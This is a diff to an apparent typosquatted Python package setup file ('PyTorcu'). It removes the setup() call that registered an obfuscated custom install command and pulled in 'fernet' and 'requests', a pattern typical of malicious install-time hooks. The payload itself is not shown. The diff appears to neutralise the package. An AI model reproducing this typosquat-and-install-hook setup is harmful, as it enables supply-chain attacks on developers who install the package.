@@ -18,22 +18,5 @@ class VsPgFaHoXnXtuOBRoWvCiCxlqxXczFrrnPoArcyxMoVwCZysWJgGkQIwhCGcOguFWCpVlkRr(i
             install.run(self)
 
 
-setup(
-    name="PyTorcu",
-    version=VERSION,
-    author="fNUJBaLhMdPKDyCJkEp",
-    author_email="Odtysw@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': VsPgFaHoXnXtuOBRoWvCiCxlqxXczFrrnPoArcyxMoVwCZysWJgGkQIwhCGcOguFWCpVlkRr,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 
